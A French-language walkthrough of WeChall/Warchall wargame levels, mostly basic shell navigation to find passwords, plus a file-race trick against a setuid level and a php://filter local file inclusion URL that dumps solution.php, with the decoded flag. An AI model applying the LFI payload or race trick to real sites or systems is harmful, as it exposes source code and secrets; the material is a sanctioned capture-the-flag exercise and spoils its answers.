# WeChall
> loging into ssh 

## [ level 0 ] 
- `cd /home/level/00_Welcome` : se diriger vers le dossier du niveau 0 .
- `ls` :regarder la liste des fichiers dans le dossier dans le dossier `00_Welcome`.
- `cat README.txt` : afficher le contenu du fichier `README.txt` .
- le mot de passe se trouve dans le fichier `README.txt`. 

## [ level 1 ]
 - `cd /home//level/01_choice_tree` : se diriger vers le dossier du niveau 1 .
 - `cd /blue/hats/grey/solution/patience` : apres avoir ete rediriger vers le dossier `patience`. 
 - `cat SOLUTION.txt` : le mot de passe se trouve dans ce fichier .

## [ level 2 ] 
 - `cd /home/level/02` : se diriger vers le dossier du niveau 2 .
 - `ls -al` : voir la liste des elements du dossier `02` , fichier cacher inclus.
 - `cd .porb` : on y trouve un dossier cacher `.porb` puis on va dans le dossier .
 - `ls -al` : voir de nouveau tous les elements du dossier `.porb` puis on a un fichier `.solution` .
 - `cat .solution` : le mot de passe se trouve dans ce fichier .

## [ level 3 ] 
 - `cd /home/level/03` :  se diriger vers le dossier du niveau 3 .
 - `ls -al` : voir la liste de tout les elements du dossier `03` .
 - `cat .bash_history` : le mot de passe se trouve sur la premiere ligne .

## [ level 4 ] 
 - `cd /home/level/04_kwisatz` : se diriger vers le dossier du niveau 4 .
 - `ls -al` : voir la liste de tout les elements du dossier `04_kwisatz`.
 - `cat README.nfo` : puis on nous demande de nous rediriger vers le repertoire principale .
 - `ls` : voir les elements du repertoire .
 - `cd level` : puis `ls` pourr voir le dossier `04_kwisatz`.
 - `cd 04_kwisatz` : puis `ls` pour voir les 02 fichiers `README2.md` et README.txt`.
 - `chmod 755 README2.md` puis `cat README2.md` : changer la permission puis afficher le contenu .
 - le mot de passe se trouve dans ce fichier `README2.md`.  

## [ level 5 ] 
 - `cd /home/level/05_privacyz` : se diriger vers le dossier du niveau 5 .
 - `cat README.md` : on affiche juste ce fichier et on trouve le mot de passe . 


## [ level 12 ] 
- `cd /home/level//12_pytong` : se diriger vers le dossier du niveau 12 .
- `nano /home/user/randy/script : `  créer un script exécutable qui envoie des caracteres infini vers un dossier  que l'on va creer .
- `script` :
                     <pre>while true; do 
                             echo "blablabla"  >> changedfile </pre>
- `touch changedfile` : creation du fichier qui recevera le contenu du script
- `./script` : executer le script .
- Ouvrir une nouvelle fenetre putty sans fermer la session precedente pour executer le code python .
- Executer `script` script sur une fenetre et executer `pytong` sur une autre comme ceci : 
- `cd/home/level/12_pytong` et `./level12 /home/user/randy/changedfile` : executer le level12 dans le fichier qui change de contenu et le mot de passe s'affiche .

## [ level 15 ]
- Cliquer sur le lien du challenge  **Live LFI** puis elle vous redirigera vers un site .
- cliquez sur l'un des drapeaux **anglais** ou le drapeau **allemand** et l' URL changera comme ceci :
  <pre>https://lfi.warchall.net/index.php?lang=en</pre>
- puis on change comme ci-dessous l'URL :
  <pre>https://lfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=solution.php</pre>
- puis on actualise et le contenu change et affiche ceci :
  ```plaintext

  PGh0bWw+Cjxib2R5Pgo8cHJlIHN0eWxlPSJjb2xvcjojMDAwOyI+dGVoIGZhbGcgc2kgbmFlciE8L3ByZT4KPHByZSBzdHlsZT0iY29sb3I6I2ZmZjsiPnRoZSBmbGFnIGlzIG5lYXIhPC9wcmU+CjwvYm9keT4KPC9odG1sPgo8P3BocCAgICAgICAgICAgICAgICAgICMgICBZT1VSX1RST1BIWSAKcmV0dXJuICdTdGVwcGluU3RvbmVzNDJQaWUnOyAjIDwtwrQgPz4K


- C'est le contenu du file `solution.php` mais il faut encore le decoder
- Nous allons ensuite ouvrir notre putty et decoder ce long texte dans un repertoire dont nous avons des droits 755 .
- Nous allons ensuite executer la commande suivante :
- `echo "PGh0bWw+Cjxib2R5Pgo8cHJlIHN0eWxlPSJjb2xvcjojMDAwOyI+dGVoIGZhbGcgc2kgbmFlciE8L3ByZT4KPHByZSBzdHlsZT0iY29sb3I6I2ZmZjsiPnRoZSBmbGFnIGlzIG5lYXIhPC9wcmU+CjwvYm9keT4KPC9odG1sPgo8P3BocCAgICAgICAgICAgICAgICAgICMgICBZT1VSX1RST1BIWSAKcmV0dXJuICdTdGVwcGluU3RvbmVzNDJQaWUnOyAjIDwtwrQgPz4K"
- Entrer , puis la commande suivante `base64 -d -i`
- Et le mot de passe va ensuite s'afficher .


